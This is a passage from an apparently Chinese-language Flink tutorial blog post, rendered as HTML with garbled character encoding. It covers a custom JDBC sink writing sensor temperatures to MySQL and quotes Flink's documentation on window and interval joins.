  &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;jsiyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;15.4&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_6&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718201&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;j8iyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;6.7&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_7&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718202&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;kMiyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;38.1&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_10&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718205&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;kciyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;36.3&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_1&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718207&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;ksiyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;32.8&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_1&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718209&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;k8iyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;37.1&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_1&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718212&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h5 id="JDBCè‡ªå®šä¹‰sink"><a href="#JDBCè‡ªå®šä¹‰sink" class="headerlink" title="JDBCè‡ªå®šä¹‰sink"></a>JDBCè‡ªå®šä¹‰sink</h5><blockquote><p><a href="https://www.cnblogs.com/ywjfx/p/14263718.html">Flinkä¹‹Mysqlæ•°æ®CDC</a></p><p><a href="https://ci.apache.org/projects/flink/flink-docs-release-1.12/zh/dev/connectors/jdbc.html">JDBC Connector</a>    &lt;=    å®˜æ–¹ç›®å‰æ²¡æœ‰ä¸“é—¨é’ˆå¯¹MySQLçš„ï¼Œæˆ‘ä»¬è‡ªå·±å®ç°å°±å¥½äº†</p></blockquote><p>è¿™é‡Œæµ‹è¯•çš„æ˜¯è¿æ¥MySQLã€‚</p><ol><li><p> pomä¾èµ–ï¼ˆæˆ‘æœ¬åœ°dockeré‡Œçš„mysqlæ˜¯8.0.19ç‰ˆæœ¬çš„ï¼‰  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.19<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨mysqlæœåŠ¡ï¼ˆæˆ‘æœ¬åœ°æ˜¯dockerå¯åŠ¨çš„ï¼‰ </p></li><li><p> æ–°å»ºæ•°æ®åº“  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE `flink_test` <span class="keyword">DEFAULT</span> <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci;</span><br></pre></td></tr></table></figure></li><li><p> æ–°å»ºschema  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `sensor_temp` (</span><br><span class="line">  `id` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `temp` <span class="keyword">double</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br></pre></td></tr></table></figure></li><li><p> ç¼–å†™javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.sink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> apitest.source.SourceTest4_UDF;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.sink.RichSinkFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 2:48 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkTest4_Jdbc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ = 1</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä»æ–‡ä»¶è¯»å–æ•°æ®</span></span><br><span class="line"><span class="comment">//        DataStream&lt;String&gt; inputStream = env.readTextFile(&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        // è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line"><span class="comment">//        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span></span><br><span class="line"><span class="comment">//            String[] fields = line.split(&quot;,&quot;);</span></span><br><span class="line"><span class="comment">//            return new SensorReading(fields[0], new Long(fields[1]), new Double(fields[2]));</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨ä¹‹å‰ç¼–å†™çš„éšæœºå˜åŠ¨æ¸©åº¦çš„SourceFunctionæ¥ç”Ÿæˆæ•°æ®</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = env.addSource(<span class="keyword">new</span> SourceTest4_UDF.MySensorSource());</span><br><span class="line"></span><br><span class="line">        dataStream.addSink(<span class="keyword">new</span> MyJdbcSink());</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®ç°è‡ªå®šä¹‰çš„SinkFunction</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyJdbcSink</span> <span class="keyword">extends</span> <span class="title">RichSinkFunction</span>&lt;<span class="title">SensorReading</span>&gt; </span>&#123;</span><br><span class="line">        <span class="comment">// å£°æ˜è¿æ¥å’Œé¢„ç¼–è¯‘è¯­å¥</span></span><br><span class="line">        Connection connection = <span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement insertStmt = <span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement updateStmt = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            connection = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/flink_test?useUnicode=true&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=UTF-8&amp;useSSL=false&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;example&quot;</span>);</span><br><span class="line">            insertStmt = connection.prepareStatement(<span class="string">&quot;insert into sensor_temp (id, temp) values (?, ?)&quot;</span>);</span><br><span class="line">            updateStmt = connection.prepareStatement(<span class="string">&quot;update sensor_temp set temp = ? where id = ?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¯æ¥ä¸€æ¡æ•°æ®ï¼Œè°ƒç”¨è¿æ¥ï¼Œæ‰§è¡Œsql</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(SensorReading value, Context context)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// ç›´æ¥æ‰§è¡Œæ›´æ–°è¯­å¥ï¼Œå¦‚æœæ²¡æœ‰æ›´æ–°é‚£ä¹ˆå°±æ’å…¥</span></span><br><span class="line">            updateStmt.setDouble(<span class="number">1</span>, value.getTemperature());</span><br><span class="line">            updateStmt.setString(<span class="number">2</span>, value.getId());</span><br><span class="line">            updateStmt.execute();</span><br><span class="line">            <span class="keyword">if</span> (updateStmt.getUpdateCount() == <span class="number">0</span>) &#123;</span><br><span class="line">                insertStmt.setString(<span class="number">1</span>, value.getId());</span><br><span class="line">                insertStmt.setDouble(<span class="number">2</span>, value.getTemperature());</span><br><span class="line">                insertStmt.execute();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            insertStmt.close();</span><br><span class="line">            updateStmt.close();</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¿è¡ŒFlinkç¨‹åºï¼ŒæŸ¥çœ‹MySQLæ•°æ®ï¼ˆå¯ä»¥çœ‹åˆ°MySQLé‡Œçš„æ•°æ®ä¸€ç›´åœ¨å˜åŠ¨ï¼‰  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM sensor_temp;</span></span><br><span class="line">+-----------+--------------------+</span><br><span class="line">| id        | temp               |</span><br><span class="line">+-----------+--------------------+</span><br><span class="line">| sensor_3  | 20.489172407885917 |</span><br><span class="line">| sensor_10 |  73.01289164711463 |</span><br><span class="line">| sensor_4  | 43.402500895809744 |</span><br><span class="line">| sensor_1  |  6.894772325662007 |</span><br><span class="line">| sensor_2  | 101.79309911751122 |</span><br><span class="line">| sensor_7  | 63.070612021580324 |</span><br><span class="line">| sensor_8  |  63.82606628090501 |</span><br><span class="line">| sensor_5  |  57.67115738487047 |</span><br><span class="line">| sensor_6  |  50.84442627975055 |</span><br><span class="line">| sensor_9  |  52.58400793021675 |</span><br><span class="line">+-----------+--------------------+</span><br><span class="line">10 rows in set (0.00 sec)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM sensor_temp;</span></span><br><span class="line">+-----------+--------------------+</span><br><span class="line">| id        | temp               |</span><br><span class="line">+-----------+--------------------+</span><br><span class="line">| sensor_3  | 19.498209543035923 |</span><br><span class="line">| sensor_10 |  71.92981963197121 |</span><br><span class="line">| sensor_4  | 43.566017489470426 |</span><br><span class="line">| sensor_1  |  6.378208186786803 |</span><br><span class="line">| sensor_2  | 101.71010087830145 |</span><br><span class="line">| sensor_7  |  62.11402602179431 |</span><br><span class="line">| sensor_8  |  64.33196455020062 |</span><br><span class="line">| sensor_5  |  56.39071692662006 |</span><br><span class="line">| sensor_6  | 48.952784757264894 |</span><br><span class="line">| sensor_9  | 52.078086096436685 |</span><br><span class="line">+-----------+--------------------+</span><br><span class="line">10 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ol><h4 id="Joining"><a href="#Joining" class="headerlink" title="Joining"></a>Joining</h4><blockquote><p><a href="https://ci.apache.org/projects/flink/flink-docs-release-1.12/zh/dev/stream/operators/joining.html">Joining</a></p></blockquote><h5 id="Window-Join"><a href="#Window-Join" class="headerlink" title="Window Join"></a>Window Join</h5><pre><code>A window join joins the elements of two streams that share a common key and lie in the same window. These windows can be defined by using a [window assigner](https://ci.apache.org/projects/flink/flink-docs-release-1.12/zh/dev/stream/operators/windows.html###window-assigners) and are evaluated on elements from both of the streams.The elements from both sides are then passed to a user-defined `JoinFunction` or `FlatJoinFunction`     where the user can emit results that meet the join criteria.The general usage can be summarized as follows:</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stream.join(otherStream)</span><br><span class="line">    .where(&lt;KeySelector&gt;)</span><br><span class="line">    .equalTo(&lt;KeySelector&gt;)</span><br><span class="line">    .window(&lt;WindowAssigner&gt;)</span><br><span class="line">    .apply(&lt;JoinFunction&gt;)</span><br></pre></td></tr></table></figure><h6 id="Tumbling-Window-Join"><a href="#Tumbling-Window-Join" class="headerlink" title="Tumbling Window Join"></a>Tumbling Window Join</h6><pre><code>When performing a tumbling window join, all elements with a common key and a common tumbling window are joined as pairwise combinations and passed on to a `JoinFunction` or `FlatJoinFunction`. Because this behaves like an inner join, elements of one stream that do not have elements from another stream in their tumbling window are not emitted!</code></pre><p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.12/fig/tumbling-window-join.svg###id=bGy5W&originHeight=350&originWidth=1000&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>As illustrated in the figure, we define a tumbling window with the size of 2 milliseconds, which results in windows of the form `[0,1], [2,3], ...`. The image shows the pairwise combinations of all elements in each window which will be passed on to the `JoinFunction`. Note that in the tumbling window `[6,7]` nothing is emitted because no elements exist in the green stream to be joined with the orange elements â‘¥ and â‘¦.</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">DataStream&lt;Integer&gt; orangeStream = ...</span><br><span class="line">DataStream&lt;Integer&gt; greenStream = ...</span><br><span class="line"></span><br><span class="line">orangeStream.join(greenStream)</span><br><span class="line">    .where(&lt;KeySelector&gt;)</span><br><span class="line">    .equalTo(&lt;KeySelector&gt;)</span><br><span class="line">    .window(TumblingEventTimeWindows.of(Time.milliseconds(<span class="number">2</span>)))</span><br><span class="line">    .apply (<span class="keyword">new</span> JoinFunction&lt;Integer, Integer, String&gt; ()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">join</span><span class="params">(Integer first, Integer second)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> first + <span class="string">&quot;,&quot;</span> + second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h6 id="Sliding-Window-Join"><a href="#Sliding-Window-Join" class="headerlink" title="Sliding Window Join"></a>Sliding Window Join</h6><pre><code>When performing a sliding window join, all elements with a common key and common sliding window are joined as pairwise combinations and passed on to the `JoinFunction` or `FlatJoinFunction`. Elements of one stream that do not have elements from the other stream in the current sliding window are not emitted! Note that some elements might be joined in one sliding window but not in another!</code></pre><p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.12/fig/sliding-window-join.svg###id=a8Dwf&originHeight=350&originWidth=1000&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>In this example we are using sliding windows with a size of two milliseconds and slide them by one millisecond, resulting in the sliding windows `[-1, 0],[0,1],[1,2],[2,3], â€¦`. The joined elements below the x-axis are the ones that are passed to the `JoinFunction` for each sliding window. Here you can also see how for example the orange â‘¡ is joined with the green â‘¢ in the window `[2,3]`, but is not joined with anything in the window `[1,2]`.</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">DataStream&lt;Integer&gt; orangeStream = ...</span><br><span class="line">DataStream&lt;Integer&gt; greenStream = ...</span><br><span class="line"></span><br><span class="line">orangeStream.join(greenStream)</span><br><span class="line">    .where(&lt;KeySelector&gt;)</span><br><span class="line">    .equalTo(&lt;KeySelector&gt;)</span><br><span class="line">    .window(SlidingEventTimeWindows.of(Time.milliseconds(<span class="number">2</span>) <span class="comment">/* size */</span>, Time.milliseconds(<span class="number">1</span>) <span class="comment">/* slide */</span>))</span><br><span class="line">    .apply (<span class="keyword">new</span> JoinFunction&lt;Integer, Integer, String&gt; ()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">join</span><span class="params">(Integer first, Integer second)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> first + <span class="string">&quot;,&quot;</span> + second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h6 id="Session-Window-Join"><a href="#Session-Window-Join" class="headerlink" title="Session Window Join"></a>Session Window Join</h6><pre><code>When performing a session window join, all elements with the same key that when _â€œcombinedâ€_ fulfill the session criteria are joined in pairwise combinations and passed on to the `JoinFunction` or `FlatJoinFunction`. Again this performs an inner join, so if there is a session window that only contains elements from one stream, no output will be emitted!</code></pre><p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.12/fig/session-window-join.svg###id=RyB4t&originHeight=350&originWidth=1000&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>Here we define a session window join where each session is divided by a gap of at least 1ms. There are three sessions, and in the first two sessions the joined elements from both streams are passed to the `JoinFunction`. In the third session there are no elements in the green stream, so â‘§ and â‘¨ are not joined!</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.EventTimeSessionWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">DataStream&lt;Integer&gt; orangeStream = ...</span><br><span class="line">DataStream&lt;Integer&gt; greenStream = ...</span><br><span class="line"></span><br><span class="line">orangeStream.join(greenStream)</span><br><span class="line">    .where(&lt;KeySelector&gt;)</span><br><span class="line">    .equalTo(&lt;KeySelector&gt;)</span><br><span class="line">    .window(EventTimeSessionWindows.withGap(Time.milliseconds(<span class="number">1</span>)))</span><br><span class="line">    .apply (<span class="keyword">new</span> JoinFunction&lt;Integer, Integer, String&gt; ()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">join</span><span class="params">(Integer first, Integer second)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> first + <span class="string">&quot;,&quot;</span> + second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h5 id="Interval-Join"><a href="#Interval-Join" class="headerlink" title="Interval Join"></a>Interval Join</h5><p>The interval join joins elements of two streams (weâ€™ll call them A &amp; B for now) with a common key and where elements of stream B have timestamps that lie in a relative time interval to timestamps of elements in stream A.</p><p>This can also be expressed more formally as <code>b.timestamp âˆˆ [a.timestamp + lowerBound; a.timestamp + upperBound]</code> or <code>a.timestamp + lowerBound &lt;= b.timestamp &lt;= a.timestamp + upperBound</code></p><p>where a and b are elements of A and B that share a common key. Both the lower and upper bound can be either negative or positive as long as as the lower bound is always smaller or equal to the upper bound. The interval join currently only performs inner joins.</p><p>When a pair of elements are passed to the <code>ProcessJoinFunction</code>, they will be assigned with the larger timestamp (which can be accessed via the <code>ProcessJoinFunction.Context</code>) of the two elements.</p><p><strong>Note</strong> The interval join currently only supports event time.</p><p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.12/fig/interval-join.svg###id=RcqYV&originHeight=350&originWidth=1000&originalType=binary&ratio=1&status=done&style=none"></p><p>In the example above, we join two streams â€˜orangeâ€™ and â€˜greenâ€™ with a lower bound of -2 milliseconds and an upper bound of +1 millisecond. Be default, these boundaries are inclusive, but <code>.lowerBoundExclusive()</code> and <code>.upperBoundExclusive</code> can be applied to change the behaviour.</p><p>Using the more formal notation again this will translate to</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orangeElem.ts + lowerBound &lt;= greenElem.ts &lt;= orangeElem.ts + upperBound</span><br></pre></td></tr></table></figure><p>as indicated by the triangles.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.co.ProcessJoinFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">DataStream&lt;Integer&gt; orangeStream = ...</span><br><span class="line">DataStream&lt;Integer&gt; greenStream = ...</span><br><span class="line"></span><br><span class="line">orangeStream</span><br><span class="line">    .keyBy(&lt;KeySelector&gt;)</span><br><span class="line">    